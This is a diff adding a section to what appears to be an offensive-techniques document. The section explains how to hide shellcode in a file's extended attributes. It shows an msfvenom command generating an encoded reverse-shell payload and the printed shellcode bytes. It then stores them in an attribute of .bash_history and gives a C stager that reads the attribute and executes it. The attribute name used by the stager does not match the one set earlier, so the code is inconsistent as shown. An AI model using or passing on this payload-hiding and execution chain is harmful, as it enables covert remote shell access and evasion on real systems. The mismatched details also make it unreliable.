@@ -123,3 +123,74 @@ if __name__ == "__main__":
         
     download_and_execute_from_github(github_url)
 ```
+
+## Abusing Extended Attributes
+
+Create a simple payload:
+
+```sh
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=5555 -b '\x00' -f bash
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+Found 3 compatible encoders
+Attempting to encode payload with 1 iterations of x64/xor
+x64/xor succeeded with size 119 (iteration=0)
+x64/xor chosen with final size 119
+Payload size: 119 bytes
+Final size of bash file: 533 bytes
+export buf=\
+$'\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05\xef'\
+$'\xff\xff\xff\x48\xbb\x87\x22\xe0\xd6\x4b\x28\x0d\x73\x48'\
+$'\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xed\x0b\xb8'\
+$'\x4f\x21\x2a\x52\x19\x86\x7c\xef\xd3\x03\xbf\x45\xca\x85'\
+$'\x22\xf5\x65\x34\x28\x0d\x72\xd6\x6a\x69\x30\x21\x38\x57'\
+$'\x19\xad\x7a\xef\xd3\x21\x2b\x53\x3b\x78\xec\x8a\xf7\x13'\
+$'\x27\x08\x06\x71\x48\xdb\x8e\xd2\x60\xb6\x5c\xe5\x4b\x8e'\
+$'\xf9\x38\x40\x0d\x20\xcf\xab\x07\x84\x1c\x60\x84\x95\x88'\
+$'\x27\xe0\xd6\x4b\x28\x0d\x73'
+```
+
+Store the bytes in the extended attributes of a file:
+
+```sh
+setfattr --name=user.victim --value="$buf" .bash_history
+```
+
+Now the contents of the shellcode are stored in the user extended attribute called “victim” of the file `.bash_history`.
+
+```sh
+getfattr --encoding=hex --dump .bash_history
+
+# file: .bash_history
+user.victim=0x4831c94881e9f6ffffff488d05efffffff48bb8722e0d64b280d7348315827482df8ffffffe2f4ed0bb84f212a5219867cefd303bf45ca8522f56534280d72d66a693021385719ad7aefd3212b533b78ec8af7132708067148db8ed260b65ce54b8ef938400d20cfab07841c6084958827e0d64b280d73
+```
+
+We can read and execute the extended file attribute which launches the reverse shell.
+
+```c
+#include <stdio.h>
+#include <sys/xattr.h>
+
+// gcc -fno-stack-protector -z execstack stager.c
+
+int main() {
+    const char *file_path = "/home/siren/.bash_history";
+    const char *attr_name = "user.1337";
+    char attr_value[119];
+    ssize_t ret;
+
+    ret = getxattr(file_path, attr_name, attr_value, sizeof(attr_value));
+    if (ret == -1) {
+        perror("getxattr");
+        return 1;
+    }
+
+    int (*func)();
+    func = (int (*)()) attr_value;
+    (int)(*func)();
+}
+```
+
+By default, extended attributes are not preserved by `tar`, `cp`, `rsync`, and other similar programs.
+
+Source: [Kernal](https://kernal.eu/about/)
